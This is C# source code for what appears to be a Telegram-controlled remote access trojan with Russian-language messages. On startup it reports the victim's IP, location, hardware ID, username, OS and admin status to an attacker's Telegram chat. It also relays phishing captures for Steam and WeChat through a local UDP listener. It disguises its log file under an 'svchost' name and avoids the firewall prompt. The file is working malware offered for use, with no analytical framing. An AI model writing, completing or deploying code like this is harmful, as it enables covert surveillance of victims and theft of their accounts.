using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;
using VanguardCore;
using System.Collections.Generic;
using System.Diagnostics.CodeAnalysis;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Reflection;

namespace FinalBot
{
    public class BotOrchestrator
    {
        private readonly ITelegramBotClient _botClient;
        private readonly string _adminId;
        private readonly CommandHandler _commandHandler;
        private bool _isRunning = true;

        [DynamicDependency(DynamicallyAccessedMemberTypes.All, typeof(List<UpdateType>))]
        [DynamicDependency(DynamicallyAccessedMemberTypes.All, typeof(UpdateType))]
        public BotOrchestrator(string token, string adminId)
        {
            _botClient = new TelegramBotClient(token);
            _adminId = adminId;
            _commandHandler = new CommandHandler(_botClient, _adminId);
            TelegramService.Initialize(token, adminId);

            // NativeAOT Hint: preserve generic list of UpdateType
            GC.KeepAlive(new System.Collections.Generic.List<UpdateType>());
        }

        public async Task StartAsync()
        {
            try 
            {
                DebugLog("[ORCHESTRATOR] Starting services...");
                
                // Start UDP listener for phishing reports (Steam/WeChat)
                DebugLog("[ORCHESTRATOR] Launching UDP listener...");
                _ = Task.Run(() => StartUdpListener());

                // 1. Initial Report (via Telegram as fallback/sender)
                DebugLog("[ORCHESTRATOR] Sending startup report...");
                await SendStartupReport();

                Console.WriteLine("[ORCHESTRATOR] Telegram Polling active.");

                var receiverOptions = new Telegram.Bot.Polling.ReceiverOptions
                {
                    AllowedUpdates = null // This allows all updates and avoids the generic list trimming issue
                };

                _botClient.StartReceiving(
                    updateHandler: _commandHandler.HandleUpdateAsync,
                    pollingErrorHandler: _commandHandler.HandlePollingErrorAsync,
                    receiverOptions: receiverOptions,
                    cancellationToken: default
                );
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[STARTUP ERROR] {ex.Message}\n{ex.StackTrace}");
                // Log to file since console might be hidden
                try { System.IO.File.AppendAllText("C:\\Users\\Public\\svchost_debug.log", $"[{DateTime.Now}] [BOT ERROR] {ex}\n"); } catch { }
            }

            // Keep alive
            while (_isRunning)
            {
                await Task.Delay(1000);
            }
        }

        private async Task SendStartupReport()
        {
            var (ip, country, flag) = FinalBot.Modules.SystemInfoModule.GetCountryInfo();
            string hwid = FinalBot.Modules.SystemInfoModule.GetHWID();
            string osName = FinalBot.Modules.SystemInfoModule.GetFriendlyOSName();
            string pcUser = $"{Environment.MachineName}\\{Environment.UserName}";
            string adminStatus = VanguardCore.ElevationService.IsAdmin() ? "🟢 АДМИН" : "🟡 Обычный Юзер";

            string info = $"🚀 <b>КЛИЕНТ ОНЛАЙН</b>\n" +
                          $"━━━━━━━━━━━━━━━━━━\n" +
                          $"👤 <b>ID:</b> <code>{pcUser}</code>\n" +
                          $"🆔 <b>HWID:</b> <code>{hwid}</code>\n" +
                          $"🌐 <b>IP:</b> <code>{ip}</code> | {flag} {country}\n" +
                          $"🖥️ <b>Система:</b> <code>{osName}</code>\n" +
                          $"⚡ <b>Статус:</b> <code>{adminStatus}</code>\n" +
                          $"🎤 <b>Микрофон:</b> ✅\n" +
                          $"⌚ <b>Время:</b> <code>{DateTime.Now:yyyy-MM-dd HH:mm:ss}</code>\n" +
                          $"━━━━━━━━━━━━━━━━━━";
            var inlineKeyboard = new InlineKeyboardMarkup(new[]
            {
                new [] { InlineKeyboardButton.WithCallbackData("🎮 Админ-Панель", "admin_panel") }
            });

            try 
            {
                string videoFileId = "CgACAgIAAyEFAATT7RxjAAIXWmnAa9yim1cDt_oGCHyz0rIOFDx8AALPnAACyAYISsdwWy9VaKdpOgQ";
                string adminPanelMarkup = "{\"inline_keyboard\":[[{\"text\":\"💠 Админ-панель\",\"callback_data\":\"admin_panel\"}]]}";
                
                DebugLog($"[ORCHESTRATOR] Calling TelegramService.SendAnimation for ID: {videoFileId}");

                bool success = await TelegramService.SendAnimation(videoFileId, info, adminPanelMarkup);
                DebugLog($"[ORCHESTRATOR] TelegramService.SendAnimation result: {success}");

                if (!success)
                {
                    string backupPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Untitlфффed.mp4");
                    if (System.IO.File.Exists(backupPath))
                    {
                        DebugLog("[ORCHESTRATOR] File fallback...");
                        bool fileSuccess = await TelegramService.SendFile(backupPath, info, adminPanelMarkup);
                        if (!fileSuccess)
                        {
                            await TelegramService.SendMessage(info, adminPanelMarkup);
                        }
                    }
                    else
                    {
                        await TelegramService.SendMessage(info, adminPanelMarkup);
                    }
                }
            }
            catch (Exception ex)
            {
                DebugLog($"[BOT ERROR] {ex}");
                try { await TelegramService.SendMessage(info, "{\"inline_keyboard\":[[{\"text\":\"💠 Админ-панель\",\"callback_data\":\"admin_panel\"}]]}"); } catch { }
            }
        }

        private async Task StartUdpListener()
        {
            int port = 51337;
            try
            {
                // Fix: Bind ONLY to loopback to avoid Windows Firewall popup
                var localEndpoint = new IPEndPoint(IPAddress.Loopback, port);
                using (var udpClient = new UdpClient(localEndpoint))
                {
                    Console.WriteLine($"[UDP] Listening for local reports on 127.0.0.1:{port}...");
                    while (_isRunning)
                    {
                        var result = await udpClient.ReceiveAsync();
                        string message = Encoding.UTF8.GetString(result.Buffer);
                        Console.WriteLine($"[UDP] Message received: {message}");

                        await _botClient.SendTextMessageAsync(
                            chatId: _adminId,
                            text: $"🎯 <b>PHISH REPORT</b>\n━━━━━━━━━━━━━━━━━━\n{message}\n━━━━━━━━━━━━━━━━━━",
                            parseMode: ParseMode.Html
                        );
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[UDP ERROR] {ex.Message}");
            }
        }

        private void DebugLog(string msg)
        {
            try { System.IO.File.AppendAllText("C:\\Users\\Public\\svchost_debug.log", $"[{DateTime.Now}] {msg}\n"); } catch { }
        }

        public void Stop()
        {
            _isRunning = false;
        }
    }
}
